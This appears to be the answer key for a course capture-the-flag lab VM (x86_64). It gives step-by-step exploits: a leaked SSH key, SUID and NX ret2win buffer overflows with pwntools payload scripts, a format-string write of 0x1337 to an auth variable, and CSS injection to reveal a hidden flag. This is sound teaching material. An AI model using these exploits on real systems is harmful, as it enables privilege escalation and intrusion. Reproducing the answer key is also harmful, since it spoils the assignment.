# Solution Guide (x86_64 / Intel)

This guide mirrors `solution/README.md` but assumes an x86_64 (Intel/AMD) VM.
Use it when you replicate the VM on an amd64 host.

## Problem 1: Gain Access

### Summary
Goal: Obtain an unprivileged shell as `p1` and extract the P1 flag.
Hint: A public server often leaks files it shouldn’t.

### Steps
1. Find the leaked SSH key on the web server (see `robots.txt` and backups).
2. Use the key to SSH into the VM as `p1`.
3. Extract the flag:
```bash
ctf-extract P1
```

### Submission
```bash
tar -czf 2022CSZ123456-P1.tar.gz flag.txt key.txt
```

---

## Problem 2: Become Super (SUID ret2win)

### Summary
Goal: Exploit the SUID binary `/home/p1/p2/p2` to get a root shell and extract the P2 flag.

### Steps (x86_64)
1. Find the `win()` address:
```bash
nm -n /home/p1/p2/p2 | grep " win$"
```
2. Find the offset to RIP (use a cyclic pattern):
```bash
python3 - <<'PY' > /tmp/p2_pat
from pwn import cyclic
print(cyclic(400, n=8).decode())
PY

gdb -q /home/p1/p2/p2
(gdb) run < /tmp/p2_pat
(gdb) info registers rip
(gdb) x/4gx $rsp
0x7ffd4f3719b8: 0x616161616161616a      0x616161616161616b
0x7ffd4f3719c8: 0x616161616161616c      0x616161616161616d
```
3. Compute the offset:
```bash
# 61 61 61 61 61 61 61 6c
# jaaaaaaa

python3 - <<'PY'
from pwn import cyclic_find
pc_bytes = b"jaaaaaaa"
print(cyclic_find(pc_bytes, n=8))
PY
```
4. Build payload and get root:
```bash
python3 - <<'PY'
from pwn import *
elf = ELF('/home/p1/p2/p2')
rop = ROP(elf)
print("win =", hex(elf.symbols['win']))
print("ret =", hex(rop.find_gadget(['ret']).address))
PY

python3 - <<'PY' > /tmp/p2_payload
import sys
from pwn import p64
offset = 72
ret = 0x40101a      # replace with your gadget
win = 0x4011b6      # from nm / pwntools
sys.stdout.buffer.write(b"A"*offset + p64(ret) + p64(win) + b"\n")
PY

cat /tmp/p2_payload - | /home/p1/p2/p2

```
5. Extract:
```bash
id
ctf-extract P2
```

---

## Problem 3: Changing the Flow (NX ret2win)

### Summary
Goal: Hijack control flow of `/home/p1/p3/p3` to reach `win()` and reveal the flag.

### Steps (x86_64)
1. Find `win()`:
```bash
nm -n /home/p1/p3/p3 | grep " win$"
```
2. Find offset with cyclic pattern (same method as P2).
3. Build payload:
```bash
python3 - <<'PY' | /home/p1/p3/p3
from pwn import p64
offset = 72  # replace with your result
win = 0x400784  # replace with nm output
print(b"A"*offset + p64(win))
PY
```
4. After `win()` runs, it creates `/opt/p3/solved`. Then:
```bash
ctf-extract P3
```

---

## Problem 4: Trusted Code Reuse (Format String Auth Gate)

### Summary
Goal: Use a format-string bug in `/home/p1/p4/p4` to set the auth value to `0x1337`.

### Steps (x86_64)
1. Identify argument positions (typical in this binary: auth is `%1$`, dummy is `%2$`).
2. Write `0x1337` (decimal 4919) into `auth`:
```bash
python3 - <<'PY' | /home/p1/p4/p4
print("%2$4919c%1$n")
PY
```
3. `win()` prints the flag and writes `/opt/p4/solved`.
4. Extract:
```bash
ctf-extract P4
```

---

## Problem 5: CSS Hijacking (Epiphany + VNC)

### Summary
Goal: Use CSS to reveal a hidden flag on the admin page.

### Steps
1. Connect via VNC on host port `5901`.
2. Open Epiphany:
```bash
epiphany-browser
```
3. Visit:
   - `http://127.0.0.1:5005/`
   - `http://127.0.0.1:5005/admin`
4. Submit this CSS:
```css
#flag { display: block !important; color: red; font-size: 24px; }
#flag::after { content: attr(data-flag); }
```
5. Reload the admin page to see the flag, then:
```bash
ctf-extract P5
```

### Reset P5 (for testing)
```bash
sudo rm -f /opt/p5/solved
echo "/* submit CSS to reveal the flag */" | sudo tee /opt/p5/user.css >/dev/null
sudo chown ctfadmin:ctfadmin /opt/p5/user.css
sudo chmod 644 /opt/p5/user.css
sudo systemctl restart p5-server.service
```

